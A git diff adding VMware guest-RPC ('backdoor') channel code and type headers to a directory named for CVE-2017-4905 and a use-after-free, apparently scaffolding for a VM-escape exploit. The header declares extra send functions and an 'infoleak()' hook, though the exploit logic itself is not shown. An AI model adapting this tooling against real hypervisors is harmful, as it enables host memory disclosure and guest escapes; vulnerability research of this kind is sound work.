+					Backdoor_HbIn(&bphb);
+					if ((bphb.in.bx.halfs.high & MESSAGE_STATUS_SUCCESS) == 0) {
+						if ((bphb.in.bx.halfs.high & MESSAGE_STATUS_CPT) != 0) {
+							/* A checkpoint occurred. Retry the operation. --hpreg */
+							goto retry;
+						}
+
+						MESSAGE_LOG("Message: Unable to receive a message over the "
+							"communication channel %u\n", chan->id);
+						goto error_quit;
+					}
+				}
+			}
+			else {
+				/*
+				* High-bandwidth backdoor port not supported. Receive the message, 4
+				* bytes at a time. --hpreg
+				*/
+
+				for (;;) {
+					if (myBufSize == 0) {
+						/* We are done */
+						break;
+					}
+
+					/* IN: Type */
+					bp.in.cx.halfs.high = MESSAGE_TYPE_RECVPAYLOAD;
+					/* IN: Id and cookie */
+					bp.in.dx.halfs.high = chan->id;
+					bp.in.si.word = chan->cookieHigh;
+					bp.in.di.word = chan->cookieLow;
+					/* IN: Status for the previous request (that succeeded) */
+					bp.in.size = MESSAGE_STATUS_SUCCESS;
+
+					bp.in.cx.halfs.low = BDOOR_CMD_MESSAGE;
+					Backdoor(&bp);
+
+					/* OUT: Status */
+					if ((bp.in.cx.halfs.high & MESSAGE_STATUS_SUCCESS) == 0) {
+						if ((bp.in.cx.halfs.high & MESSAGE_STATUS_CPT) != 0) {
+							/* A checkpoint occurred. Retry the operation. --hpreg */
+							goto retry;
+						}
+
+						MESSAGE_LOG("Message: Unable to receive a message over the "
+							"communication channel %u\n", chan->id);
+						goto error_quit;
+					}
+
+					/* OUT: Type */
+					if (bp.in.dx.halfs.high != MESSAGE_TYPE_SENDPAYLOAD) {
+						MESSAGE_LOG("Message: Protocol error. Expected a "
+							"MESSAGE_TYPE_SENDPAYLOAD from vmware\n");
+						goto error_quit;
+					}
+
+					/* OUT: Piece of message */
+					/*
+					* Beware in case we are not allowed to write extra bytes beyond the
+					* end of the buffer. --hpreg
+					*/
+					switch (myBufSize) {
+					case 1:
+						myBuf[0] = bp.out.bx.word & 0xff;
+						myBufSize -= 1;
+						break;
+					case 2:
+						myBuf[0] = bp.out.bx.word & 0xff;
+						myBuf[1] = (bp.out.bx.word >> 8) & 0xff;
+						myBufSize -= 2;
+						break;
+					case 3:
+						myBuf[0] = bp.out.bx.word & 0xff;
+						myBuf[1] = (bp.out.bx.word >> 8) & 0xff;
+						myBuf[2] = (bp.out.bx.word >> 16) & 0xff;
+						myBufSize -= 3;
+						break;
+					default:
+						*(uint32 *)myBuf = bp.out.bx.word;
+						myBufSize -= 4;
+						break;
+					}
+
+					myBuf += 4;
+				}
+			}
+
+			/* Write a trailing NUL just after the message. --hpreg */
+			chan->in[*bufSize] = '\0';
+
+			/* IN: Type */
+			bp.in.cx.halfs.high = MESSAGE_TYPE_RECVSTATUS;
+			/* IN: Id and cookie */
+			bp.in.dx.halfs.high = chan->id;
+			bp.in.si.word = chan->cookieHigh;
+			bp.in.di.word = chan->cookieLow;
+			/* IN: Status for the previous request (that succeeded) */
+			bp.in.size = MESSAGE_STATUS_SUCCESS;
+
+			bp.in.cx.halfs.low = BDOOR_CMD_MESSAGE;
+			Backdoor(&bp);
+
+			/* OUT: Status */
+			if ((bp.in.cx.halfs.high & MESSAGE_STATUS_SUCCESS) == 0) {
+				if ((bp.in.cx.halfs.high & MESSAGE_STATUS_CPT) != 0) {
+					/* A checkpoint occurred. Retry the operation. --hpreg */
+					goto retry;
+				}
+
+				MESSAGE_LOG("Message: Unable to receive a message over the "
+					"communication channel %u\n", chan->id);
+				goto error_quit;
+			}
+
+			return TRUE;
+
+		error_quit:
+			/* IN: Type */
+			if (myBufSize == 0) {
+				bp.in.cx.halfs.high = MESSAGE_TYPE_RECVSTATUS;
+			}
+			else {
+				bp.in.cx.halfs.high = MESSAGE_TYPE_RECVPAYLOAD;
+			}
+			/* IN: Id and cookie */
+			bp.in.dx.halfs.high = chan->id;
+			bp.in.si.word = chan->cookieHigh;
+			bp.in.di.word = chan->cookieLow;
+			/* IN: Status for the previous request (that failed) */
+			bp.in.size = 0;
+
+			bp.in.cx.halfs.low = BDOOR_CMD_MESSAGE;
+			Backdoor(&bp);
+
+			/* OUT: Status */
+			if ((bp.in.cx.halfs.high & MESSAGE_STATUS_SUCCESS) == 0) {
+				MESSAGE_LOG("Message: Unable to signal an error of reception over the "
+					"communication channel %u\n", chan->id);
+				return FALSE;
+			}
+
+			return FALSE;
+		}
+
+
+	/*
+	*-----------------------------------------------------------------------------
+	*
+	* Message_CloseAllocated --
+	*
+	*    Close a communication channel that had been allocated by the
+	*    caller.  (For use with Message_OpenAllocated.)
+	*
+	* Result:
+	*    TRUE on success, the channel is destroyed
+	*    FALSE on failure
+	*
+	* Side-effects:
+	*    None
+	*
+	*-----------------------------------------------------------------------------
+	*/
+
+	Bool
+		Message_CloseAllocated(Message_Channel *chan) // IN/OUT
+	{
+			Backdoor_proto bp;
+			Bool ret = TRUE;
+
+			/* IN: Type */
+			bp.in.cx.halfs.high = MESSAGE_TYPE_CLOSE;
+			/* IN: Id and cookie */
+			bp.in.dx.halfs.high = chan->id;
+			bp.in.si.word = chan->cookieHigh;
+			bp.in.di.word = chan->cookieLow;
+
+			bp.in.cx.halfs.low = BDOOR_CMD_MESSAGE;
+			Backdoor(&bp);
+
+			/* OUT: Status */
+			if ((bp.in.cx.halfs.high & MESSAGE_STATUS_SUCCESS) == 0) {
+				MESSAGE_LOG("Message: Unable to close the communication channel %u\n",
+					chan->id);
+				ret = FALSE;
+			}
+
+			if (!chan->inPreallocated) {
+				free(chan->in);
+			}
+			chan->in = NULL;
+
+			return ret;
+		}
+
+
+	/*
+	*-----------------------------------------------------------------------------
+	*
+	* Message_Close --
+	*
+	*    Close a communication channel.
+	*
+	* Result:
+	*    TRUE on success, the channel is destroyed
+	*    FALSE on failure
+	*
+	* Side-effects:
+	*    None
+	*
+	*-----------------------------------------------------------------------------
+	*/
+
+	Bool
+		Message_Close(Message_Channel *chan) // IN/OUT
+	{
+			Bool ret = Message_CloseAllocated(chan);
+
+			free(chan);
+			return ret;
+		}
+
+#ifdef __cplusplus
+}
+#endif
diff --git a/CVE-2017-4905_and_uaf/vmware/message.h b/CVE-2017-4905_and_uaf/vmware/message.h
new file mode 100644
index 0000000..a10bfaa
--- /dev/null
+++ b/CVE-2017-4905_and_uaf/vmware/message.h
@@ -0,0 +1,87 @@
+/*********************************************************
+ * Copyright (C) 1999-2016 VMware, Inc. All rights reserved.
+ *
+ * This program is free software; you can redistribute it and/or modify it
+ * under the terms of the GNU Lesser General Public License as published
+ * by the Free Software Foundation version 2.1 and no later version.
+ *
+ * This program is distributed in the hope that it will be useful, but
+ * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
+ * or FITNESS FOR A PARTICULAR PURPOSE.  See the Lesser GNU General Public
+ * License for more details.
+ *
+ * You should have received a copy of the GNU Lesser General Public License
+ * along with this program; if not, write to the Free Software Foundation, Inc.,
+ * 51 Franklin St, Fifth Floor, Boston, MA  02110-1301 USA.
+ *
+ *********************************************************/
+
+/*********************************************************
+ * The contents of this file are subject to the terms of the Common
+ * Development and Distribution License (the "License") version 1.0
+ * and no later version.  You may not use this file except in
+ * compliance with the License.
+ *
+ * You can obtain a copy of the License at
+ *         http://www.opensource.org/licenses/cddl1.php
+ *
+ * See the License for the specific language governing permissions
+ * and limitations under the License.
+ *
+ *********************************************************/
+
+/*
+ * message.h --
+ *
+ *    Second layer of the internal communication channel between guest
+ *    applications and vmware
+ */
+
+#ifndef __MESSAGE_H__
+#   define __MESSAGE_H__
+
+#ifdef __cplusplus
+extern "C" {
+#endif
+
+#include "vm_basic_types.h"
+
+
+/* The channel object */
+typedef struct Message_Channel {
+   /* Identifier */
+   uint16 id;
+
+   /* Reception buffer */
+   /*  Data */
+   unsigned char *in;
+   /*  Allocated size */
+   size_t inAlloc;
+   Bool inPreallocated;
+
+   /* The cookie */
+   uint32 cookieHigh;
+   uint32 cookieLow;
+} Message_Channel;
+
+Bool Message_OpenAllocated(uint32 proto, Message_Channel *chan,
+                           char *receiveBuffer, size_t receiveBufferSize);
+Message_Channel* Message_Open(uint32 proto);
+Bool Message_Send(Message_Channel *chan, const unsigned char *buf,
+                  size_t bufSize);
+Bool Message_SendHigh(Message_Channel *chan, const unsigned char *buf,
+	size_t bufSize);
+Bool Message_SendLow(Message_Channel *chan, const unsigned char *buf,
+	size_t bufSize);
+Bool Message_Receive(Message_Channel *chan, unsigned char **buf,
+                     size_t *bufSize);
+Bool Message_CloseAllocated(Message_Channel *chan);
+Bool Message_SendSize(Message_Channel *chan,unsigned int size);
+Bool Message_Close(Message_Channel *chan);
+
+void *infoleak();
+#ifdef __cplusplus
+}
+#endif
+
+#endif /* __MESSAGE_H__ */
diff --git a/CVE-2017-4905_and_uaf/vmware/vm_basic_types.h b/CVE-2017-4905_and_uaf/vmware/vm_basic_types.h
new file mode 100644
index 0000000..9f70e4a
--- /dev/null
+++ b/CVE-2017-4905_and_uaf/vmware/vm_basic_types.h
@@ -0,0 +1,1204 @@
+/*********************************************************
+ * Copyright (C) 1998-2016 VMware, Inc. All rights reserved.
+ *
+ * This program is free software; you can redistribute it and/or modify it
+ * under the terms of the GNU Lesser General Public License as published
+ * by the Free Software Foundation version 2.1 and no later version.
+ *
+ * This program is distributed in the hope that it will be useful, but
+ * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
+ * or FITNESS FOR A PARTICULAR PURPOSE.  See the Lesser GNU General Public
+ * License for more details.
+ *
+ * You should have received a copy of the GNU Lesser General Public License
+ * along with this program; if not, write to the Free Software Foundation, Inc.,
+ * 51 Franklin St, Fifth Floor, Boston, MA  02110-1301 USA.
+ *
+ *********************************************************/
+
+/*********************************************************
+ * Redistribution and use in source and binary forms, with or without
+ * modification, are permitted provided that the following conditions
+ * are met:
+ *
+ * 1. Redistributions of source code must retain the above copyright
+ *    notice, this list of conditions and the following disclaimer.
+ * 2. Redistributions in binary form must reproduce the above copyright
+ *    notice, this list of conditions and the following disclaimer in the
+ *    documentation and/or other materials provided with the distribution.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
+ * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+ * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+ * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
+ * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+ * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
+ * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+ * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
+ * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
+ * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
+ * SUCH DAMAGE.
+ *
+ *********************************************************/
+
+/*********************************************************
+ * The contents of this file are subject to the terms of the Common
+ * Development and Distribution License (the "License") version 1.0
+ * and no later version.  You may not use this file except in
+ * compliance with the License.
+ *
+ * You can obtain a copy of the License at
+ *         http://www.opensource.org/licenses/cddl1.php
+ *
+ * See the License for the specific language governing permissions
+ * and limitations under the License.
+ *
+ *********************************************************/
+
+/*
+ *
+ * vm_basic_types.h --
+ *
+ *    basic data types.
+ */
+
+
+#ifndef _VM_BASIC_TYPES_H_
+#define _VM_BASIC_TYPES_H_
+
+#define INCLUDE_ALLOW_USERLEVEL
+
+#define INCLUDE_ALLOW_MODULE
+#define INCLUDE_ALLOW_VMMON
+#define INCLUDE_ALLOW_VMKERNEL
+#define INCLUDE_ALLOW_VMKDRIVERS
+#define INCLUDE_ALLOW_VMK_MODULE
+#define INCLUDE_ALLOW_DISTRIBUTE
+#define INCLUDE_ALLOW_VMCORE
+//#include "includeCheck.h"
+
+/* STRICT ANSI means the Xserver build and X defines Bool differently. */
+#if !defined(_XTYPEDEF_BOOL) && \
+    (!defined(__STRICT_ANSI__) || defined(__FreeBSD__) || defined(__MINGW32__))
+#define _XTYPEDEF_BOOL
+typedef char           Bool;
+#endif
+
+#ifndef FALSE
+#define FALSE          0
+#endif
+
+#ifndef TRUE
+#define TRUE           1
+#endif
+
+#define IsBool(x)      (((x) & ~1) == 0)
+#define IsBool2(x, y)  ((((x) | (y)) & ~1) == 0)
+
+/*
+ * Macros __i386__ and __ia64 are intrinsically defined by GCC
+ */
+#if defined _MSC_VER && defined _M_X64
+#  define __x86_64__
+#elif defined _MSC_VER && defined _M_IX86
+#  define __i386__
+#endif
+
+/*
+ * Setup a bunch of defines for instruction set architecture (ISA) related
+ * properties.
+ *
+ * For compiler types/size:
+ *
+ * - VM_32BIT for a 32-bit ISA (with the same C compiler types/sizes as 32-bit
+ *   x86/ARM).
+ * - VM_64BIT for a 64-bit ISA (with the same C compiler types/sizes as 64-bit
+ *   x86/ARM).
+ *
+ * For a given <arch> in {X86, ARM}:
+ *
+ * - VM_<arch>_32 for the 32-bit variant.
+ * - VM_<arch>_64 for the 64-bit variant.
+ * - VM_<arch>_ANY for any variant of <arch>.
+ *
+ * VM_X86_ANY is synonymous with the confusing and deprecated VM_I386 (which
+ * should really be VM_X86_32).
+ */
+
+#ifdef __i386__
+/* VM_I386 is historically synonymous with VM_X86_ANY in bora, but misleading,
+ * since it is confused with the __i386__ gcc but defined for both 32- and
+ * 64-bit x86. We retain it here for legacy compatibility.
+ */
+#define VM_I386
+#define VM_X86_32
+#define VM_X86_ANY
+#define VM_32BIT
+#endif
+
+#ifdef __x86_64__
+#define VM_X86_64
+#define VM_I386
+#define VM_X86_ANY
+#define VM_64BIT
+#define vm_x86_64 (1)
+#else
+#define vm_x86_64 (0)
+#endif
+
+#ifdef __arm__
+#define VM_ARM_32
+#define VM_ARM_ANY
+#define VM_32BIT
+#endif
+
+#ifdef __aarch64__
+#define VM_ARM_64
+#define VM_ARM_ANY
+#define VM_64BIT
+#define vm_arm_64 (1)
+#else
+#define vm_arm_64 (0)
+#endif
+
+#ifdef _MSC_VER
+
+#pragma warning (3 :4505) // unreferenced local function
+#pragma warning (disable :4018) // signed/unsigned mismatch
+#pragma warning (disable :4761) // integral size mismatch in argument; conversion supplied
+#pragma warning (disable :4305) // truncation from 'const int' to 'short'
+#pragma warning (disable :4244) // conversion from 'unsigned short' to 'unsigned char'
+#pragma warning (disable :4267) // truncation of 'size_t'
+#pragma warning (disable :4146) // unary minus operator applied to unsigned type, result still unsigned
+#pragma warning (disable :4142) // benign redefinition of type
+
+#endif
+
+#if defined(__linux__) && defined(__cplusplus) && __cplusplus >= 201103L
+
+/*
+ * We're using stdint.h instead of cstdint below because of libstdcpp.cpp.
+ * It looks like a C++ file. When being preprocessed all the C++ specific
+ * defines(e.g. __cplusplus) are set, but the C++ include paths are not.
+ */
+#include <stdint.h>
+
+typedef char          Bool;
+
+typedef uint64_t    uint64;
+typedef  int64_t     int64;
+typedef uint32_t    uint32;
+typedef  int32_t     int32;
+typedef uint16_t    uint16;
+typedef  int16_t     int16;
+typedef  uint8_t     uint8;
+typedef   int8_t      int8;
+
+typedef uint64 BA;
+typedef uint64 MA;
+typedef uint32 MPN32;
+
+#elif defined(__APPLE__) || defined(HAVE_STDINT_H)
+
+/*
+ * TODO: This is a C99 standard header.  We should be able to test for
+ * #if __STDC_VERSION__ >= 199901L, but that breaks the Netware build
+ * (which doesn't have stdint.h).
+ */
+
+#include <stdint.h>
+
+typedef uint64_t    uint64;
+typedef  int64_t     int64;
+typedef uint32_t    uint32;
+typedef  int32_t     int32;
+typedef uint16_t    uint16;
+typedef  int16_t     int16;
+typedef  uint8_t    uint8;
+typedef   int8_t     int8;
+
+/*
+ * Note: C does not specify whether char is signed or unsigned, and
+ * both gcc and msvc implement processor-specific signedness.  With
+ * three types:
+ * typeof(char) != typeof(signed char) != typeof(unsigned char)
+ *
+ * Be careful here, because gcc (4.0.1 and others) likes to warn about
+ * conversions between signed char * and char *.
+ */
+
+#else /* !HAVE_STDINT_H */
+
+#ifdef _MSC_VER
+
+typedef unsigned __int64 uint64;
+typedef signed __int64 int64;
+
+#elif __GNUC__
+/* The Xserver source compiles with -ansi -pendantic */
+#   if !defined(__STRICT_ANSI__) || defined(__FreeBSD__)
+#      if defined(VM_X86_64) || defined(VM_ARM_64)
+typedef unsigned long uint64;
+typedef long int64;
+#      else
+typedef unsigned long long uint64;
+typedef long long int64;
+#      endif
+#   endif
+#else
+#   error - Need compiler define for int64/uint64
+#endif /* _MSC_VER */
+
+typedef unsigned int       uint32;
+typedef unsigned short     uint16;
+typedef unsigned char      uint8;
+
+typedef int                int32;
+typedef short              int16;
+typedef signed char        int8;
+
+#endif /* HAVE_STDINT_H */
+
+/*
+ * FreeBSD (for the tools build) unconditionally defines these in
+ * sys/inttypes.h so don't redefine them if this file has already
+ * been included. [greg]
+ *
+ * This applies to Solaris as well.
+ */
+
+/*
+ * Before trying to do the includes based on OS defines, see if we can use
+ * feature-based defines to get as much functionality as possible
+ */
+
+#ifdef HAVE_INTTYPES_H
+#include <inttypes.h>
+#endif
+#ifdef HAVE_SYS_TYPES_H
+#include <sys/types.h>
+#endif
+#ifdef HAVE_SYS_INTTYPES_H
+#include <sys/inttypes.h>
+#endif
+#ifdef HAVE_STDLIB_H
+#include <stdlib.h>
+#endif
+
+#ifdef __FreeBSD__
+#include <sys/param.h> /* For __FreeBSD_version */
+#endif
+
+#if !defined(USING_AUTOCONF)
+#   if defined(__FreeBSD__) || defined(sun)
+#      ifdef KLD_MODULE
+#         include <sys/types.h>
+#      else
+#         if __FreeBSD_version >= 500043
+#            if !defined(VMKERNEL)
+#               include <inttypes.h>
+#            endif
+#            include <sys/types.h>
+#         else
+#            include <sys/inttypes.h>
+#         endif
+#      endif
+#   elif defined __APPLE__
+#      if KERNEL
+#         include <sys/unistd.h>
+#         include <sys/types.h> /* mostly for size_t */
+#         include <stdint.h>
+#      else
+#         include <unistd.h>
+#         include <inttypes.h>
+#         include <stdlib.h>
+#         include <stdint.h>
+#      endif
+#   elif defined __ANDROID__
+#      include <stdint.h>
+#   else
+#      if !defined(__intptr_t_defined) && !defined(intptr_t)
+#         ifdef VM_I386
+#            define __intptr_t_defined
+#            if defined(VM_X86_64)
+typedef int64     intptr_t;
+#            else
+typedef int32     intptr_t;
+#            endif
+#         elif defined(VM_ARM_64)
+#            define __intptr_t_defined
+typedef int64     intptr_t;
+#         elif defined(__arm__)
+#            define __intptr_t_defined
+typedef int32     intptr_t;
+#         endif
+#      endif
+
+#      ifndef _STDINT_H
+#         ifdef VM_I386
+#            if defined(VM_X86_64)
+typedef uint64    uintptr_t;
+#            else
+typedef uint32    uintptr_t;
+#            endif
+#         elif defined(VM_ARM_64)
+typedef uint64    uintptr_t;
+#         elif defined(__arm__)
+typedef uint32    uintptr_t;
+#         endif
+#      endif
+#   endif
+#endif
+
+
+#if defined(__GNUC__) && defined(__SIZEOF_INT128__)
+
+typedef unsigned __int128 uint128;
+typedef          __int128  int128;
+
+#define MIN_INT128   ((int128)1 << 127)
+#define MAX_INT128   (~MIN_INT128)
+#define MIN_UINT128  ((uint128)0)
+#define MAX_UINT128  (~MIN_UINT128)
+
+#endif
+
+
+/*
+ * Time
+ * XXX These should be cleaned up.  -- edward
+ */
+
+typedef int64 VmTimeType;          /* Time in microseconds */
+typedef int64 VmTimeRealClock;     /* Real clock kept in microseconds */
+typedef int64 VmTimeVirtualClock;  /* Virtual Clock kept in CPU cycles */
+
+/*
+ * Printf format specifiers for size_t and 64-bit number.
+ * Use them like this:
+ *    printf("%" FMT64 "d\n", big);
+ * The spaces are important for C++11 compatibility.
+ *
+ * FMTH is for handles/fds.
+ */
+
+#ifdef _MSC_VER
+   #define FMT64      "I64"
+   #ifdef VM_X86_64
+      #define FMTSZ      "I64"
+      #define FMTPD      "I64"
+      #define FMTH       "I64"
+   #else
+      #define FMTSZ      "I"
+      #define FMTPD      "I"
+      #define FMTH       "I"
+   #endif
+#elif defined __APPLE__
+   /* Mac OS hosts use the same formatters for 32- and 64-bit. */
+   #define FMT64 "ll"
+   #if KERNEL
+      #define FMTSZ "l"
+   #else
+      #define FMTSZ "z"
+   #endif
+   #define FMTPD "l"
+   #define FMTH ""
+#elif __GNUC__
+   #define FMTH ""
+   #if defined(N_PLAT_NLM) || defined(sun)
+      #if defined(VM_X86_64) || defined(VM_ARM_64)
+         #define FMTSZ  "l"
+         #define FMTPD  "l"
+      #else
+         #define FMTSZ  ""
+         #define FMTPD  ""
+      #endif
+   #elif defined(__linux__) || \
+        (defined(__FreeBSD__) && (__FreeBSD__ + 0))\
+      || (defined(_POSIX_C_SOURCE) && _POSIX_C_SOURCE >= 200112L) \
+      || (defined(_POSIX_VERSION) && _POSIX_VERSION >= 200112L) \
+      || (defined(_POSIX2_VERSION) && _POSIX2_VERSION >= 200112L)
+      /* BSD, Linux */
+      #define FMTSZ     "z"
+
+      #if defined(VM_X86_64) || defined(VM_ARM_64)
+         #define FMTPD  "l"
+      #else
+         #define FMTPD  ""
+      #endif
+   #else
+      /* Systems with a pre-C99 libc */
+      #define FMTSZ     "Z"
+      #if defined(VM_X86_64) || defined(VM_ARM_64)
+         #define FMTPD  "l"
+      #else
+         #define FMTPD  ""
+      #endif
+   #endif
+   #if defined(VM_X86_64) || defined(VM_ARM_64)
+      #define FMT64     "l"
+   #elif defined(sun) || defined(__FreeBSD__)
+      #define FMT64     "ll"
+   #else
+      #define FMT64     "L"
+   #endif
+#else
+   #error - Need compiler define for FMT64 and FMTSZ
+#endif
+
+/*
+ * Suffix for 64-bit constants.  Use it like this:
+ *    CONST64(0x7fffffffffffffff) for signed or
+ *    CONST64U(0x7fffffffffffffff) for unsigned.
+ *
+ * 2004.08.30(thutt):
+ *   The vmcore/asm64/gen* programs are compiled as 32-bit
+ *   applications, but must handle 64 bit constants.  If the
+ *   64-bit-constant defining macros are already defined, the
+ *   definition will not be overwritten.
+ */
+
+#if !defined(CONST64) || !defined(CONST64U)
+#ifdef _MSC_VER
+#define CONST64(c) c##I64
+#define CONST64U(c) c##uI64
+#elif defined __APPLE__
+#define CONST64(c) c##LL
+#define CONST64U(c) c##uLL
+#elif __GNUC__
+#if defined(VM_X86_64) || defined(VM_ARM_64)
+#define CONST64(c) c##L
+#define CONST64U(c) c##uL
+#else
+#define CONST64(c) c##LL
+#define CONST64U(c) c##uLL
+#endif
+#else
+#error - Need compiler define for CONST64
+#endif
+#endif
+
+/*
+ * Use CONST3264/CONST3264U if you want a constant to be
+ * treated as a 32-bit number on 32-bit compiles and
+ * a 64-bit number on 64-bit compiles. Useful in the case
+ * of shifts, like (CONST3264U(1) << x), where x could be
+ * more than 31 on a 64-bit compile.
+ */
+
+#if defined(VM_X86_64) || defined(VM_ARM_64)
+    #define CONST3264(a) CONST64(a)
+    #define CONST3264U(a) CONST64U(a)
+#else
+    #define CONST3264(a) (a)
+    #define CONST3264U(a) (a)
+#endif
+
+#define MIN_INT8   ((int8)0x80)
+#define MAX_INT8   ((int8)0x7f)
+
+#define MIN_UINT8  ((uint8)0)
+#define MAX_UINT8  ((uint8)0xff)
+
+#define MIN_INT16  ((int16)0x8000)
+#define MAX_INT16  ((int16)0x7fff)
+
+#define MIN_UINT16 ((uint16)0)
+#define MAX_UINT16 ((uint16)0xffff)
+
+#define MIN_INT32  ((int32)0x80000000)
+#define MAX_INT32  ((int32)0x7fffffff)
+
+#define MIN_UINT32 ((uint32)0)
+#define MAX_UINT32 ((uint32)0xffffffff)
+
+#define MIN_INT64  (CONST64(0x8000000000000000))
+#define MAX_INT64  (CONST64(0x7fffffffffffffff))
+
+#define MIN_UINT64 (CONST64U(0))
+#define MAX_UINT64 (CONST64U(0xffffffffffffffff))
+
+typedef uint8 *TCA;  /* Pointer into TC (usually). */
+
+/*
+ * Type big enough to hold an integer between 0..100
+ */
+typedef uint8 Percent;
+#define AsPercent(v)	((Percent)(v))
+
+
+typedef uintptr_t VA;
+typedef uintptr_t VPN;
+
+typedef uint64    PA;
+typedef uint32    PPN;
+
+typedef uint64    TPA;
+typedef uint32    TPPN;
+
+typedef uint64    PhysMemOff;
+typedef uint64    PhysMemSize;
+
+/* The Xserver source compiles with -ansi -pendantic */
+#ifndef __STRICT_ANSI__
+typedef uint64    BA;
+#endif
+
+#ifdef VMKERNEL
+typedef void     *BPN;
+#else
+typedef uint64    BPN;
+#endif
+
+#define UINT64_2_BPN(u) ((BPN)(u))
+#define BPN_2_UINT64(b) ((uint64)(b))
+
+typedef uint32    PageNum;
+typedef unsigned      MemHandle;
+typedef unsigned int  IoHandle;
+typedef int32     World_ID;
+
+/* !! do not alter the definition of INVALID_WORLD_ID without ensuring
+ * that the values defined in both bora/public/vm_basic_types.h and
+ * lib/vprobe/vm_basic_types.h are the same.  Additionally, the definition
+ * of VMK_INVALID_WORLD_ID in vmkapi_world.h also must be defined with
+ * the same value
+ */
+
+#define INVALID_WORLD_ID ((World_ID)0)
+
+typedef World_ID User_CartelID;
+#define INVALID_CARTEL_ID INVALID_WORLD_ID
+
+typedef User_CartelID User_SessionID;
+#define INVALID_SESSION_ID INVALID_CARTEL_ID
+
+typedef User_CartelID User_CartelGroupID;
+#define INVALID_CARTELGROUP_ID INVALID_CARTEL_ID
+
+typedef uint32 Worldlet_ID;
+#define INVALID_WORLDLET_ID ((Worldlet_ID)-1)
+
+typedef  int8    Reg8;
+typedef  int16   Reg16;
+typedef  int32   Reg32;
+typedef  int64   Reg64;
+
+typedef uint8   UReg8;
+typedef uint16  UReg16;
+typedef uint32  UReg32;
+typedef uint64  UReg64;
+
+#if defined(VMM) || defined(COREQUERY) || defined(EXTDECODER) ||  \
+    defined (VMKERNEL) || defined (VMKBOOT)
+typedef  Reg64  Reg;
+typedef UReg64 UReg;
+#endif
+/* The Xserver source compiles with -ansi -pendantic */
+#ifndef __STRICT_ANSI__
+typedef uint64 MA;
+typedef uint32 MPN32;
+#endif
+
+/*
+ * This type should be used for variables that contain sector
+ * position/quantity.
+ */
+typedef uint64 SectorType;
+
+/*
+ * Linear address
+ */
+
+typedef uintptr_t LA;
+typedef uintptr_t LPN;
+#define LA_2_LPN(_la)     ((_la) >> PAGE_SHIFT)
+#define LPN_2_LA(_lpn)    ((_lpn) << PAGE_SHIFT)
+
+#define LAST_LPN   ((((LA)  1) << (8 * sizeof(LA)   - PAGE_SHIFT)) - 1)
+#define LAST_LPN32 ((((LA32)1) << (8 * sizeof(LA32) - PAGE_SHIFT)) - 1)
+#define LAST_LPN64 ((((LA64)1) << (8 * sizeof(LA64) - PAGE_SHIFT)) - 1)
+
+/* Valid bits in a LPN. */
+#define LPN_MASK   LAST_LPN
+#define LPN_MASK32 LAST_LPN32
+#define LPN_MASK64 LAST_LPN64
+
+/*
+ * On 64 bit platform, address and page number types default
+ * to 64 bit. When we need to represent a 32 bit address, we use
+ * types defined below.
+ *
+ * On 32 bit platform, the following types are the same as the
+ * default types.
+ */
+typedef uint32 VA32;
+typedef uint32 VPN32;
+typedef uint32 LA32;
+typedef uint32 LPN32;
+typedef uint32 PA32;
+typedef uint32 PPN32;
+
+/*
+ * On 64 bit platform, the following types are the same as the
+ * default types.
+ */
+typedef uint64 VA64;
+typedef uint64 VPN64;
+typedef uint64 LA64;
+typedef uint64 LPN64;
+typedef uint64 PA64;
+typedef uint64 PPN64;
+typedef uint64 MA64;
+typedef uint64 MPN;
+
+/*
+ * IO device DMA virtual address and page number (translated by IOMMU to
+ * MA/MPN). IOPN can be in the inclusive range 0 -> MAX_IOPN.
+ */
+typedef uint64 IOA;
+typedef uint64 IOPN;
+
+/*
+ * VA typedefs for user world apps.
+ */
+typedef VA32 UserVA32;
+typedef VA64 UserVA64;
+typedef UserVA64 UserVAConst; /* Userspace ptr to data that we may only read. */
+typedef UserVA32 UserVA32Const; /* Userspace ptr to data that we may only read. */
+typedef UserVA64 UserVA64Const; /* Used by 64-bit syscalls until conversion is finished. */
+#ifdef VMKERNEL
+typedef UserVA64 UserVA;
+#else
+typedef void * UserVA;
+#endif
+
+
+#define MAX_PPN_BITS      31
+#define MAX_PPN           (((PPN)1 << MAX_PPN_BITS) - 1) /* Maximal observable PPN value. */
+#define INVALID_PPN       ((PPN)0xffffffff)
+#define APIC_INVALID_PPN  ((PPN)0xfffffffe)
+
+#define INVALID_BPN       ((BPN)0x000000ffffffffffull)
+
+#define MPN38_MASK        ((1ull << 38) - 1)
+
+#define RESERVED_MPN      ((MPN)0)
+#define INVALID_MPN       ((MPN)MPN38_MASK)
+#define MEMREF_MPN        ((MPN)MPN38_MASK - 1)
+#define RELEASED_MPN      ((MPN)MPN38_MASK - 2)
+
+/* account for special MPNs defined above */
+#define MAX_MPN           ((MPN)MPN38_MASK - 3) /* 50 bits of address space */
+
+#define INVALID_IOPN      ((IOPN)-1)
+#define MAX_IOPN          (INVALID_IOPN - 1)
+
+#define INVALID_LPN       ((LPN)-1)
+#define INVALID_VPN       ((VPN)-1)
+#define INVALID_LPN64     ((LPN64)-1)
+#define INVALID_PAGENUM   ((PageNum)-1)
+
+/*
+ * Format modifier for printing VA, LA, and VPN.
+ * Use them like this: Log("%#" FMTLA "x\n", laddr)
+ */
+
+#if defined(VMM) || defined(FROBOS64) || vm_x86_64 || vm_arm_64 || defined __APPLE__
+#   define FMTLA "l"
+#   define FMTVA "l"
+#   define FMTVPN "l"
+#else
+#   define FMTLA ""
+#   define FMTVA ""
+#   define FMTVPN ""
+#endif
+
+#ifndef EXTERN
+#define EXTERN        extern
